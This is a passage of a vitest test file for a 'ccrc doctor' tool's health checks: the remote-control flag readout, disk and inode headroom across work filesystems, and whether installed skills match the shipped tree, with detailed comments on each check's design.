// `ccrc doctor`, part: fleet-box (D-6767): the rc, disk, skills and pools checks. They moved here unchanged from
// `ccrc-doctor-fleet.test.ts`, itself a part of what was one 17,000-line file, which ran about 386 s on a CI runner and past the
// trace job's 1560 s budget under `strace -f`; the fixtures the parts share are in `ccrc-doctorFixture.ts`.
import { describe, it, expect } from 'vitest';
import { spawnSync } from 'node:child_process';
import { writeFileSync, readFileSync, mkdirSync, symlinkSync, rmSync, chmodSync, existsSync, cpSync } from 'node:fs';
import path, { join } from 'node:path';
import { removeTmpFixturesEachTest } from './tmpHelpers.js';
import { scaled } from './timeScale.js';
import { ghContainedEnv, seedAccountsSh } from './ccdWsHelpers.js';
import { POOLED_TEST_ROSTER } from './fixtures/poolRule.js';
import { installDoctorHooks, here, REPO, BASH, unstub, linkReal, RosterEntry, writeRoster, entry, writeWrapper, writeBinary, writeCcrcEnv, writeRcFlag, writeUnitFile, removeUnitFile, stubDf, DfRow, stubDfMap, runDoctor, healthy, broken, lineFor } from './ccrc-doctorFixture.js';

// Each case's homes go when the case ends, not in a file-wide end sweep (R100, review 518's S1): that sweep overran vitest's 20 s
// hook timeout on the one file this family was split from. Registered before `installDoctorHooks()`'s root `afterEach` (the codex
// lanes' process kill) because vitest runs after-hooks in reverse order of registration: that kill still sees its home.
removeTmpFixturesEachTest();
installDoctorHooks();

// ── what this box's sessions are spawned AS ───────────────────────────────
// Stage 2e, Task 2 (fix round 1). `~/.ccrc/remote-control` is the per-box
// switch `ccd`'s `_rc_enabled` reads on every spawn (D-99), and `rc` is a check
// OF ITS OWN in the table. It was first shipped as an append to
// `_check_config`'s two PASS details, which coupled a fact about SPAWN SHAPE to
// the health of an unrelated file: the readout vanished on four arms — the
// fleet-role SKIP and all three `ccrc.env` WARNs — so the reference fleet host,
// the one box in the topology that actually runs `on`, printed nothing about it
// while three shipped pointers told operators to look there. A standalone check
// is strictly smaller AND correct: it reads one file and answers about one
// thing.
//
// ALWAYS PASS, never WARN or FAIL. The state is a FACT, not a defect — both
// values are legitimate states for a box to be in, and a doctor that WARNed
// about `on` (or about `off`) would be asserting a preference it has no
// standing for. Even the two degraded forms are PASSes: they say what ccd will
// do, which is the question. This file's remedy contract makes that concrete —
// a WARN owes a remedy, and there is no remedy for "your box is configured the
// way you configured it".
//
// FIVE PRINTED FORMS OVER THREE SEMANTIC STATES, and the two extra forms are
// the point of having a helper at all:
//   on                        — this box publishes its sessions to claude.ai
//   off                       — a deliberate off, written by somebody
//   off (default)             — no file; ccd reads absent as off
//   off (unparseable …)       — a file whose first line is neither, INCLUDING
//                               the newline-less `on` that `read` rejects at
//                               EOF-before-delimiter. Reporting that as a
//                               deliberate `off` tells an operator they chose
//                               a mode when their edit simply did not take.
//   off (unreadable …)        — the file is there and nothing came out of it.
//                               A mode problem and a bytes problem are two
//                               different mornings; `_check_config` splits the
//                               same pair for `ccrc.env` two screens up.
//
// MUTATIONS MEASURED (applied to the shipped helper, run, reverted): recorded
// beside the implementation in this task's report.
describe('ccrc doctor: rc — the state this box spawns its sessions in', () => {
  const rcLine = (home: string): string => lineFor(runDoctor(home).stdout, 'rc') ?? '';

  it('is a check of its own, and it answers on a FLEET-ROLE box — where config SKIPs', () => {
    // THE FINDING THIS CHECK EXISTS FOR (fix round 1, Important). The state was
    // first appended to `_check_config`'s two PASS details, which made a fact
    // about SPAWN SHAPE conditional on the health of `ccrc.env` — a file the
    // fleet host does not have at all (D-86's topology branch SKIPs it). So on
    // the reference fleet, the ONE box that runs `on`, doctor said nothing
    // about RC while `ccd`, `ccrc-doctor-checks` and the README all pointed
    // operators at a line that was not printed there.
    //
    // The fixture is that box: agent unit, no `ccrc.env`, flag `on`.
    const home = healthy('ccrc-doctor-rc-fleetrole-');
    rmSync(join(home, '.ccrc', 'ccrc.env'), { force: true });
    removeUnitFile(home, 'ccrc.service');
    writeUnitFile(home, 'ccrc-agent.service');
    writeFileSync(join(home, 'fixture-unit-ccrc-agent.service'), 'active\n');
    writeRcFlag(home, 'on\n');
    const r = runDoctor(home);
    expect(r.stdout, r.stdout).toMatch(/^PASS rc: on$/m);
    // …and `config` still SKIPs on that box, unchanged: the two checks are
    // independent now, which is the whole point.
    expect(r.stdout).toMatch(/^SKIP config: /m);
    expect(r.stdout).not.toMatch(/^(PASS|WARN|FAIL) config: /m);
  });

  it('answers when ccrc.env is UNREADABLE too — the two files are unrelated', () => {
    // The other three silent arms were the `ccrc.env` WARNs. A chmod-000
    // `ccrc.env` says nothing whatsoever about how sessions spawn, and it used
    // to take the RC readout down with it.
    const home = healthy('ccrc-doctor-rc-envwarn-');
    rmSync(join(home, '.ccrc', 'ccrc.env'), { force: true });
    writeRcFlag(home, 'on\n');
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^WARN config: .*defaults apply/m);
    expect(r.stdout).toMatch(/^PASS rc: on$/m);
  });

  it('says "off (default)" on a box with no flag file — absent is what ccd reads as off', () => {
    const home = healthy('ccrc-doctor-rc-absent-');
    expect(rcLine(home)).toBe('PASS rc: off (default)');
  });

  it('says "on" for a box that drives its sessions over the RC socket', () => {
    const home = healthy('ccrc-doctor-rc-on-');
    writeRcFlag(home, 'on\n');
    expect(rcLine(home)).toBe('PASS rc: on');
  });

  it('says "off" for a deliberate off, and does not dress it as the default', () => {
    // The two are different facts about the box — "nobody has decided" and
    // "somebody decided no" — and an operator reading a transcript acts on
    // them differently (one is a file to write, the other a file to edit).
    const home = healthy('ccrc-doctor-rc-off-');
    writeRcFlag(home, 'off\n');
    expect(rcLine(home)).toBe('PASS rc: off');
  });

  it('says "unparseable" for a first line that is neither — never a deliberate off', () => {
    const home = healthy('ccrc-doctor-rc-garbage-');
    writeRcFlag(home, 'yes please\n');
    expect(rcLine(home)).toBe(
      "PASS rc: off (unparseable — the file must hold one line reading 'on' or 'off')");
  });

  it('says "unparseable" for a newline-less `on` — the operator edit that did not take', () => {
    // THE CASE THE THIRD FORM EXISTS FOR, and it is not hypothetical: `printf
    // 'on' > ~/.ccrc/remote-control` is what a person types. `read` returns
    // non-zero at EOF-before-delimiter, so ccd reads those bytes as OFF, and a
    // doctor that printed a bare `off` would be telling the operator they had
    // chosen the mode their edit failed to reach. Both writers in this repo
    // end the line for exactly this reason.
    const home = healthy('ccrc-doctor-rc-nonewline-');
    writeRcFlag(home, 'on');
    expect(rcLine(home)).toMatch(/^PASS rc: off \(unparseable — /);
  });

  it('says "unparseable" for an EMPTY file — the other side of the D-100 split', () => {
    // The row D-100's whole argument turns on (review Minor 5): an empty file
    // is READABLE, so it must not report as a permissions problem. Both sides
    // of the split are asserted now — this one and the unreadable case below —
    // because a deviation that exists to keep two conditions apart is only
    // held by tests that pin BOTH of them.
    const home = healthy('ccrc-doctor-rc-empty-');
    writeRcFlag(home, '');
    expect(rcLine(home)).toMatch(/^PASS rc: off \(unparseable — /);
  });

  it.skipIf(process.getuid?.() === 0)(
    'says "unreadable" for a flag file it cannot open — a mode problem is not a bytes problem', () => {
      const home = healthy('ccrc-doctor-rc-unreadable-');
      writeRcFlag(home, 'on\n');
      chmodSync(join(home, '.ccrc', 'remote-control'), 0o000);
      const r = runDoctor(home);
      expect(lineFor(r.stdout, 'rc') ?? '').toMatch(/^PASS rc: off \(unreadable — /);
      // …and bash does not diagnose it on stderr, for `_rc_enabled`'s own
      // measured reason: the redirect is attempted with stderr already
      // suppressed, not after.
      expect(r.stderr).toBe('');
    });

  it('never WARNs and never FAILs — the state is a fact, and a WARN owes a remedy', () => {
    // Every one of the five forms, including the two degraded ones, through the
    // PASS class. A check that WARNed here would be asserting a preference
    // about how somebody should run their box, and would owe a remedy line
    // this file's contract has no sentence for.
    for (const [what, bytes] of [
      ['on', 'on\n'], ['off', 'off\n'], ['garbage', 'zzz\n'], ['empty', ''],
    ] as const) {
      const home = healthy(`ccrc-doctor-rc-alwayspass-${what}-`);
      writeRcFlag(home, bytes);
      const out = runDoctor(home).stdout;
      expect(out, what).toMatch(/^PASS rc: /m);
      expect(out, what).not.toMatch(/^(WARN|FAIL) rc: /m);
    }
  });

  it('leaves `config` carrying nothing about it — the fact has one home', () => {
    // The append is GONE, both arms. Two surfaces reporting one fact is how
    // they come to disagree, and `_check_config`'s detail is a statement about
    // `ccrc.env` again.
    const home = healthy('ccrc-doctor-rc-config-clean-');
    writeRcFlag(home, 'on\n');
    const out = runDoctor(home).stdout;
    const config = lineFor(out, 'config') ?? '';
    expect(config).toMatch(/^PASS config: /);
    expect(config).not.toContain('remote-control');
  });
});


// ── room on the filesystem $HOME is on ────────────────────────────────────
// Stage 2d, Task 2. Spec §5 asks for "disk headroom (including the backup
// dir)": a ccd workspace is a full clone, `~/.ccrc/coord.db` is a WAL database
// with no backup to fall back on (server/src/coord/db.ts (the backup restore)), and every
// deploy copies the shipped tree under `~/ccrc-backups/<ts>/` (deploy.sh (the backup step)).
// All three land on one filesystem, and all three fail in unhelpful ways when
// it is full.
//
// MUTATIONS MEASURED (applied to the shipped check, run, reverted):
//   - the ''/non-digit guard deleted -> RED, "warns when df answers something
//     it cannot read…", `to match /^WARN disk: /` (the empty Available field
//     goes into `$(( ))` instead).
//   - the 2 GiB FAIL floor deleted -> RED, "fails under the 2 GiB floor".
//   - the 10 GiB WARN floor deleted -> RED, "warns between the floor and 10
//     GiB…" (a tight box reporting a clean PASS).

describe('ccrc doctor: disk', () => {
  const GIB = 1024 * 1024;                          // in the KiB `df -Pk` reports

  it('fails under the 2 GiB floor', () => {
    const home = healthy('ccrc-doctor-disk-full-');
    stubDf(home, GIB);                              // 1 GiB
    const lines = runDoctor(home).stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL disk: '));
    expect(i, lines.join('\n')).toBeGreaterThan(-1);
    expect(lines[i]).toContain('1024 MiB free');     // MiB, because "1 GiB" and "0 GiB" are the whole range below the floor
    expect(lines[i + 1]).toMatch(/^ {2}remedy: free space on \//);
    expect(runDoctor(home).code).toBe(1);
  });

  it('warns between the floor and 10 GiB, and names the backup directory to clear', () => {
    const home = healthy('ccrc-doctor-disk-tight-');
    stubDf(home, 5 * GIB);
    const lines = runDoctor(home).stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('WARN disk: '));
    expect(i, lines.join('\n')).toBeGreaterThan(-1);
    expect(lines[i]).toContain('5 GiB free');
    expect(lines[i]).toContain('getting tight');
    expect(lines[i + 1]).toContain('~/ccrc-backups');
    expect(runDoctor(home).code).toBe(0);
  });

  it('passes naming the room it measured', () => {
    const home = healthy('ccrc-doctor-disk-ok-');
    expect(lineFor(runDoctor(home).stdout, 'disk'))
      .toMatch(/^PASS disk: 41 GiB free on \/ \(.*home.*\), /);
  });

  it('asks df for KiB and for inodes, about $HOME among the roots, and never with -h', () => {
    // `-P` because the default output wraps a long device name onto its own
    // line (and the parse takes the LAST line); `-k` because every threshold
    // here is in KiB. `df -h` would answer "41G" and the arithmetic below would
    // be nonsense.
    const home = healthy('ccrc-doctor-disk-argv-');
    runDoctor(home);
    const calls = readFileSync(join(home, 'df-calls'), 'utf8').split('\n').filter(Boolean);
    expect(calls).toContain(`-Pk ${home}`);
    expect(calls).toContain(`-Pi ${home}`);
    for (const c of calls) expect(c).toMatch(/^-P[ki] \//);
  });

  it('warns, rather than measuring nothing silently, when df is not installed', () => {
    const home = healthy('ccrc-doctor-disk-nodf-');
    unstub(home, 'df');
    const lines = runDoctor(home).stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('WARN disk: '));
    expect(i, lines.join('\n')).toBeGreaterThan(-1);
    expect(lines[i]).toContain('cannot measure free space');
    expect(lines[i + 1]).toMatch(/coreutils|util-linux/);
    expect(runDoctor(home).code).toBe(0);
  });

  it('warns when df answers something it cannot read, rather than reporting a number nobody measured', () => {
    // A df that exits nonzero printing nothing (a stale mount) used to arrive
    // as an empty Available field — and `$(( / 1048576 ))` over an empty string
    // is a bash arithmetic error, on stderr, in a check that then claims 0 GiB.
    const home = healthy('ccrc-doctor-disk-unreadable-');
    stubDf(home);
    writeFileSync(join(home, 'fixture-df-exit'), '1\n');
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^WARN disk: /m);
    // The load-bearing half: the line says the measurement did NOT happen,
    // rather than reporting the 0 an empty field arithmetics into.
    expect(r.stdout).toMatch(/free space was never measured/);
    expect(r.stdout).not.toMatch(/^(PASS|FAIL) disk: /m);
    expect(r.stdout).not.toMatch(/0 GiB|0 MiB/);
    expect(r.stderr).toBe('');
    expect(r.code).toBe(0);
  });
});


// D-6618 (plan Task DR-6; spec §2.5.2): doctor measures EVERY work filesystem, one line each, not only $HOME's.
describe('ccrc doctor: disk, every work filesystem', () => {
  const GIB = 1024 * 1024;                          // in the KiB `df -Pk` reports
  const diskLines = (out: string): string[] => out.split('\n').filter((l) => /^(PASS|WARN|FAIL) disk: /.test(l));
  /** $HOME on the root filesystem, `projects` and `worktrees` on a second one. */
  const twoFs = (home: string, work: Partial<DfRow>, root: Partial<DfRow> = {}): void => {
    mkdirSync(join(home, 'projects'), { recursive: true });
    mkdirSync(join(home, 'worktrees'), { recursive: true });
    stubDfMap(home, [
      { prefix: join(home, 'projects'), mount: '/mnt/work', sizeKiB: 100 * GIB, usedKiB: 50 * GIB, availKiB: 50 * GIB, ...work },
      { prefix: join(home, 'worktrees'), mount: '/mnt/work', sizeKiB: 100 * GIB, usedKiB: 50 * GIB, availKiB: 50 * GIB, ...work },
      { prefix: '*', mount: '/', sizeKiB: 100 * GIB, usedKiB: 10 * GIB, availKiB: 90 * GIB, ...root },
    ]);
  };

  it('two roots on one filesystem print one line naming both', () => {
    const home = healthy('ccrc-doctor-disk-one-line-');
    twoFs(home, {});
    const lines = diskLines(runDoctor(home).stdout);
    const work = lines.filter((l) => l.includes('/mnt/work'));
    expect(work, lines.join('\n')).toHaveLength(1);
    expect(work[0]).toContain('projects');
    expect(work[0]).toContain('worktrees');
    expect(lines.filter((l) => l.includes(' on / '))).toHaveLength(1);
  });

  it('a work root on a second filesystem at 93% is FAIL even when $HOME is at 10%', () => {
    const home = healthy('ccrc-doctor-disk-second-fs-');
    twoFs(home, { usedKiB: 93 * GIB, availKiB: 7 * GIB });
    const r = runDoctor(home);
    const lines = diskLines(r.stdout);
    expect(lines.find((l) => l.includes('/mnt/work')), lines.join('\n')).toMatch(/^FAIL disk: /);
    expect(lines.find((l) => l.includes(' on / '))).toMatch(/^PASS disk: /);
    expect(r.code).toBe(1);
  });

  it('92% of bytes is FAIL and 85% is WARN, at the edges', () => {
    const at = (usedPct: number): string => {
      const home = healthy('ccrc-doctor-disk-pct-');
      twoFs(home, { sizeKiB: 1000 * GIB, usedKiB: usedPct * 10 * GIB, availKiB: (100 - usedPct) * 10 * GIB });
      return diskLines(runDoctor(home).stdout).find((l) => l.includes('/mnt/work')) ?? '';
    };
    expect(at(91)).toMatch(/^WARN disk: /);
    expect(at(92)).toMatch(/^FAIL disk: /);
    expect(at(84)).toMatch(/^PASS disk: /);
    expect(at(85)).toMatch(/^WARN disk: /);
  });

  it('inodes at 90% are WARN, and at 92% FAIL, while bytes are at 10%', () => {
    const home = healthy('ccrc-doctor-disk-inodes-');
    twoFs(home, { usedKiB: 10 * GIB, availKiB: 90 * GIB, inodes: 1_000_000, iused: 900_000 });
    const line = diskLines(runDoctor(home).stdout).find((l) => l.includes('/mnt/work')) ?? '';
    expect(line).toMatch(/^WARN disk: /);
    expect(line).toContain('inodes');
    const home2 = healthy('ccrc-doctor-disk-inodes-fail-');
    twoFs(home2, { usedKiB: 10 * GIB, availKiB: 90 * GIB, inodes: 1_000_000, iused: 920_000 });
    expect(diskLines(runDoctor(home2).stdout).find((l) => l.includes('/mnt/work'))).toMatch(/^FAIL disk: /);
  });

  it('under 2 GiB free on a second filesystem is FAIL and under 10 GiB is WARN, whatever the percent', () => {
    const home = healthy('ccrc-doctor-disk-floor-');
    twoFs(home, { sizeKiB: 100 * GIB, usedKiB: 10 * GIB, availKiB: 1 * GIB });
    expect(diskLines(runDoctor(home).stdout).find((l) => l.includes('/mnt/work'))).toMatch(/^FAIL disk: .*1024 MiB free/);
    const home2 = healthy('ccrc-doctor-disk-floor-warn-');
    twoFs(home2, { sizeKiB: 100 * GIB, usedKiB: 10 * GIB, availKiB: 5 * GIB });
    expect(diskLines(runDoctor(home2).stdout).find((l) => l.includes('/mnt/work'))).toMatch(/^WARN disk: .*5 GiB free/);
  });

  it('an unreadable df line is WARN, never PASS', () => {
    const home = healthy('ccrc-doctor-disk-garbled-');
    twoFs(home, { mount: 'garbled' });
    const r = runDoctor(home);
    const lines = diskLines(r.stdout);
    const bad = lines.find((l) => l.includes('projects')) ?? '';
    expect(bad, lines.join('\n')).toMatch(/^WARN disk: .*never measured/);
    expect(r.stdout).not.toMatch(/^PASS disk: .*projects/m);
    expect(r.code).toBe(0);
  });

  it('prints the measured percent past the FAIL line, never the threshold', () => {
    const home = healthy('ccrc-doctor-disk-99pct-');
    twoFs(home, { sizeKiB: 100 * GIB, usedKiB: 99 * GIB, availKiB: 1 * GIB, inodes: 1_000_000, iused: 980_000 });
    const line = diskLines(runDoctor(home).stdout).find((l) => l.includes('/mnt/work')) ?? '';
    expect(line).toMatch(/^FAIL disk: /);
    expect(line).toContain('99% of bytes');
    expect(line).toContain('98% of inodes');
  });

  it.skipIf(process.getuid?.() === 0)('a root under an unsearchable parent is WARN naming it, never an all-PASS', () => {
    const home = healthy('ccrc-doctor-disk-unstatable-');
    const locked = join(home, 'locked');
    mkdirSync(join(locked, 'cfg'), { recursive: true });
    writeFileSync(join(home, '.ccrc', 'accounts.sh'), `CCRC_ACCOUNTS=(lane-a)\n_ccrc_cfg_dir() { echo "${locked}/cfg"; }\n`);
    chmodSync(locked, 0o000);
    try {
      const r = runDoctor(home);
      const lines = diskLines(r.stdout);
      const warn = lines.find((l) => l.startsWith('WARN disk: ')) ?? '';
      expect(warn, lines.join('\n')).toContain('config-dirs');
      expect(warn).toContain(`${locked}/cfg`);
      expect(warn).toContain('never measured');
    } finally {
      chmodSync(locked, 0o755);
    }
  });

  it('a config dir from the roster is measured with its own filesystem', () => {
    const home = healthy('ccrc-doctor-disk-config-dir-');
    mkdirSync(join(home, '.claude-a'), { recursive: true });
    writeFileSync(join(home, '.ccrc', 'accounts.sh'), 'CCRC_ACCOUNTS=(lane-a)\n_ccrc_cfg_dir() { echo "$HOME/.claude-a"; }\n');
    stubDfMap(home, [
      { prefix: join(home, '.claude-a'), mount: '/mnt/cfg', sizeKiB: 100 * GIB, usedKiB: 95 * GIB, availKiB: 5 * GIB },
      { prefix: '*', mount: '/', sizeKiB: 100 * GIB, usedKiB: 10 * GIB, availKiB: 90 * GIB },
    ]);
    const line = diskLines(runDoctor(home).stdout).find((l) => l.includes('/mnt/cfg')) ?? '';
    expect(line).toMatch(/^FAIL disk: /);
    expect(line).toContain('config-dirs');
  });

  it.each([
    ['fails to source', 'return 1\n'],
    ['lacks _ccrc_cfg_dir', 'CCRC_ACCOUNTS=(lane-a)\n'],
  ])('a roster projection that %s is a WARN naming config-dirs, never a silent PASS', (_n, body) => {
    const home = healthy('ccrc-doctor-disk-config-broken-');
    mkdirSync(join(home, '.claude-a'), { recursive: true });
    writeFileSync(join(home, '.ccrc', 'accounts.sh'), body);
    stubDfMap(home, [
      { prefix: join(home, '.claude-a'), mount: '/mnt/cfg', sizeKiB: 100 * GIB, usedKiB: 99 * GIB, availKiB: 1 * GIB },
      { prefix: '*', mount: '/', sizeKiB: 100 * GIB, usedKiB: 10 * GIB, availKiB: 90 * GIB },
    ]);
    const lines = diskLines(runDoctor(home).stdout);
    expect(lines.find((l) => l.includes('config-dirs')), lines.join('\n')).toMatch(/^WARN disk: .*roster projection unreadable/);
  });
});


// D-6618 (plan Task DR-6) characterization: the three verdicts on $HOME's filesystem at their edges, green on the
// check as it stood before it measured every work filesystem. They stay true after: the floors did not move.
describe('ccrc doctor: disk, the $HOME verdicts at their edges', () => {
  const GIB = 1024 * 1024;

  it('exactly 2 GiB free is a WARN, not a FAIL', () => {
    const home = healthy('ccrc-doctor-disk-edge2-');
    stubDf(home, 2 * GIB);
    expect(lineFor(runDoctor(home).stdout, 'disk')).toMatch(/^WARN disk: 2 GiB free/);
  });

  it('exactly 10 GiB free is a PASS', () => {
    const home = healthy('ccrc-doctor-disk-edge10-');
    stubDf(home, 10 * GIB);
    expect(lineFor(runDoctor(home).stdout, 'disk')).toMatch(/^PASS disk: 10 GiB free/);
  });
});


describe('ccrc doctor: skills — every home carries the SHIPPED skills (release/rollout design §6)', () => {
  const installed = (home: string, suffix: string, name: string): string => join(home, suffix, 'skills', name);

  it('passes on the healthy box, counting homes', () => {
    const home = healthy('ccrc-doctor-skills-pass-');
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^PASS skills: 1\/1 homes carry the shipped ccrc-coordinator, ccrc-worker, ccrc-reviewer, ccrc-history and ccrc-linear$/m);
  });

  it('fails on ONE edited byte in ONE home, naming the account and the skill, and the installer runs it green again', () => {
    const home = healthy('ccrc-doctor-skills-stale-');
    const f = join(installed(home, '.claude', 'ccrc-reviewer'), 'SKILL.md');
    writeFileSync(f, readFileSync(f, 'utf8').replace('$HOME/.cc-clips/', '$WT/.ccrc-review/'));   // the 2026-09-17 clause, put back
    let r = runDoctor(home);
    expect(r.code).toBe(1);
    expect(r.stdout).toMatch(/^FAIL skills: 1 skill\(s\) in the rostered homes differ from the shipped tree or are missing from their home: claude: ccrc-reviewer differs$/m);
    expect(r.stdout).toMatch(/remedy: run 'ccrc doctor --fix' .*, or 'ccrc update'/);
    // R10: the remedy's second arm must converge from the TREE the check
    // measured ($HOME/ccrc/ccd/reviewer-skill, i.e. installCcrc's planted
    // BOX_TREE_DIR copy), not the .cc-sessions placed copy — that copy was
    // stale on 2026-09-17. Pin the printed remedy names that seam.
    expect(r.stdout).toMatch(/CCRC_SKILL_SRC="\$HOME\/ccrc\/ccd\/reviewer-skill"/);
    // R12: BOTH halves come out of the measured tree — the source AND the
    // script. The remedy used to name `$HOME/.cc-sessions/install-*.sh`,
    // the other copy that was stale on 2026-09-17.
    expect(r.stdout).toMatch(/bash "\$HOME\/ccrc\/ccd\/install-reviewer-skill\.sh"/);
    // The remedy works — and it is EXACTLY the printed command that is run,
    // resolved on this fixture's box: `$HOME/ccrc/ccd/install-reviewer-skill.sh`
    // is join(home,'ccrc','ccd','install-reviewer-skill.sh') and
    // `$HOME/ccrc/ccd/reviewer-skill` is join(home,'ccrc','ccd','reviewer-skill'),
    // both installCcrc's planted tree. Invoking the REPO's copy instead (what
    // this case did before) would have stayed green with a remedy naming a
    // script the box does not have. Contained through `ghContainedEnv` like
    // every other spawn in this suite.
    const rem = spawnSync(BASH,
      [join(home, 'ccrc', 'ccd', 'install-reviewer-skill.sh'), '--homes', join(home, '.claude')],
      {
        env: ghContainedEnv(home, {
          ...process.env, HOME: home,
          CCRC_SKILL_SRC: join(home, 'ccrc', 'ccd', 'reviewer-skill'),
        }),
        encoding: 'utf8',
      });
    expect(rem.status, `${rem.stdout}${rem.stderr}`).toBe(0);
    r = runDoctor(home);
    expect(r.stdout).toMatch(/^PASS skills:/m);
  });

  it('reports ccrc-history stale when it differs, and its printed remedy runs it green again (history spec §8.9 C23)', () => {
    const home = healthy('ccrc-doctor-skills-history-stale-');
    const f = join(installed(home, '.claude', 'ccrc-history'), 'SKILL.md');
    const shipped = readFileSync(f, 'utf8');
    // An older wording a home could still carry: the literal path every command is pinned to, put back to the
    // bare word.
    writeFileSync(f, shipped.replace('"$HOME/.local/bin/ccrc" history', 'ccrc history'));
    expect(readFileSync(f, 'utf8'), 'the fixture edit changed nothing').not.toBe(shipped);
    let r = runDoctor(home);
    expect(r.code).toBe(1);
    expect(r.stdout).toMatch(/^FAIL skills: 1 skill\(s\) in the rostered homes differ from the shipped tree or are missing from their home: claude: ccrc-history differs$/m);
    expect(r.stdout).toMatch(/CCRC_SKILL_SRC="\$HOME\/ccrc\/ccd\/history-skill" bash "\$HOME\/ccrc\/ccd\/install-history-skill\.sh"/);
    // The printed command, resolved on this fixture's box: installCcrc's planted tree is `$HOME/ccrc/ccd`.
    const rem = spawnSync(BASH,
      [join(home, 'ccrc', 'ccd', 'install-history-skill.sh'), '--homes', join(home, '.claude')],
      {
        env: ghContainedEnv(home, {
          ...process.env, HOME: home,
          CCRC_SKILL_SRC: join(home, 'ccrc', 'ccd', 'history-skill'),
        }),
        encoding: 'utf8',
      });
    expect(rem.status, `${rem.stdout}${rem.stderr}`).toBe(0);
    expect(readFileSync(f, 'utf8')).toBe(shipped);
    r = runDoctor(home);
    expect(r.stdout).toMatch(/^PASS skills: 1\/1 homes carry the shipped ccrc-coordinator, ccrc-worker, ccrc-reviewer, ccrc-history and ccrc-linear$/m);
  }, scaled(90_000));   // two doctor runs: a bounded but load-slow box is not a red

  it('a home whose ccrc-history lacks only its MIT sidecar is stale too: diff -r -q compares the whole tree', () => {
    const home = healthy('ccrc-doctor-skills-history-sidecar-');
    rmSync(join(installed(home, '.claude', 'ccrc-history'), 'LICENSE.lossless-claw'));
    const r = runDoctor(home);
    expect(r.code).toBe(1);
    expect(r.stdout).toMatch(/^FAIL skills: 1 skill\(s\) in the rostered homes .*: claude: ccrc-history differs$/m);
  });

  it('the remedy names the override seam, not the bare installer (R10)', () => {
    // Mutation pin: a remedy that reverted to bare installer invocations
    // (no CCRC_SKILL_SRC) would converge from $HOME/.cc-sessions instead of
    // the measured tree — silently wrong when .cc-sessions is stale. This
    // case reds if that override is dropped from the printed remedy.
    const home = healthy('ccrc-doctor-skills-remedy-seam-');
    const f = join(installed(home, '.claude', 'ccrc-reviewer'), 'SKILL.md');
    writeFileSync(f, readFileSync(f, 'utf8').replace('$HOME/.cc-clips/', '$WT/.ccrc-review/'));
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/CCRC_SKILL_SRC="\$HOME\/ccrc\/ccd\/coordinator-skill"/);
    expect(r.stdout).toMatch(/CCRC_SKILL_SRC="\$HOME\/ccrc\/ccd\/worker-skill"/);
    expect(r.stdout).toMatch(/CCRC_SKILL_SRC="\$HOME\/ccrc\/ccd\/reviewer-skill"/);
    expect(r.stdout).toMatch(/CCRC_SKILL_SRC="\$HOME\/ccrc\/ccd\/history-skill"/);
    // R12, the other half: the SCRIPT comes from the measured tree too, and
    // the remedy no longer sends the operator to `$HOME/.cc-sessions` for it.
    for (const role of ['coordinator', 'worker', 'reviewer', 'history']) {
      expect(r.stdout).toMatch(new RegExp(`bash "\\$HOME/ccrc/ccd/install-${role}-skill\\.sh"`));
    }
    expect(r.stdout).not.toMatch(/\.cc-sessions\/install-/);
  });

  it('a missing skill directory is a FAIL in its own words', () => {
    const home = healthy('ccrc-doctor-skills-missing-');
    rmSync(installed(home, '.claude', 'ccrc-worker'), { recursive: true });
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^FAIL skills: .*claude: ccrc-worker missing/m);
    // The headline says the condition the entry says: every entry here is
    // `missing`, and a headline that only knew how to say "differ" sent the
    // operator looking for a diff that does not exist.
    expect(r.stdout).toMatch(/^FAIL skills: 1 skill\(s\) in the rostered homes differ from the shipped tree or are missing from their home:/m);
  });

  it('a second rostered home is measured too, and its config dir comes from configDirSuffix', () => {
    const home = healthy('ccrc-doctor-skills-two-');
    writeBinary(home, 'acct-a');
    writeRoster(home, [{ id: 'acct-a', configDirSuffix: '.acct-a', exec: { kind: 'generated' } }]);
    writeWrapper(home, 'acct-a', { cfgDir: '.acct-a' });
    mkdirSync(join(home, '.acct-a', 'skills'), { recursive: true });
    let r = runDoctor(home);
    expect(r.stdout).toMatch(/^FAIL skills: 5 skill\(s\) in the rostered homes differ .*acct-a: ccrc-coordinator missing.*acct-a: ccrc-worker missing.*acct-a: ccrc-reviewer missing.*acct-a: ccrc-history missing.*acct-a: ccrc-linear missing/m);
    for (const [tree, name] of [['coordinator-skill', 'ccrc-coordinator'], ['worker-skill', 'ccrc-worker'], ['reviewer-skill', 'ccrc-reviewer'], ['history-skill', 'ccrc-history'], ['linear-skill', 'ccrc-linear']] as const) {
      cpSync(join(REPO, 'ccd', tree), installed(home, '.acct-a', name), { recursive: true });
    }
    r = runDoctor(home);
    expect(r.stdout).toMatch(/^PASS skills: 2\/2 homes/m);
  });

  it('skips on a server-role box — it hosts no sessions', () => {
    const home = healthy('ccrc-doctor-skills-server-');
    writeCcrcEnv(home, ['CCRC_ROLE=server', 'CCRC_FLEET=local', 'CCRC_HOST=ccrc-fixture.invalid', 'CCRC_PORT=7788', ''].join('\n'));
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^SKIP skills: this box records CCRC_ROLE=server/m);
  });

  it('a server-role box skips EVERY per-account check the installer no longer converges there (D-3111)', () => {
    // The installer and the doctor say the same thing about a server-role box:
    // it hosts no sessions, so wrappers, credentials, agent-home memory, lane
    // settings and pool markers are nobody's concern there — a server box's
    // `ccrc update` (which ends with doctor) must not exit 1 over launchers
    // and homes ccrc does not manage on it.
    const home = healthy('ccrc-doctor-server-skips-');
    writeCcrcEnv(home, ['CCRC_ROLE=server', 'CCRC_FLEET=local', 'CCRC_HOST=ccrc-fixture.invalid', 'CCRC_PORT=7788', ''].join('\n'));
    const r = runDoctor(home);
    for (const name of ['wrappers', 'accounts', 'memory', 'routing', 'pools', 'skills', 'history']) {
      expect(r.stdout).toMatch(new RegExp(`^SKIP ${name}: this box records CCRC_ROLE=server, so it hosts no sessions`, 'm'));
      expect(r.stdout, `${name} still printed a verdict on a server-role box`).not.toMatch(new RegExp(`^(PASS|WARN|FAIL) ${name}:`, 'm'));
    }
  });

  it('skips, never passes vacuously, when the roster names no home that exists on this box', () => {
    const home = healthy('ccrc-doctor-skills-nohome-');
    rmSync(join(home, '.claude'), { recursive: true });
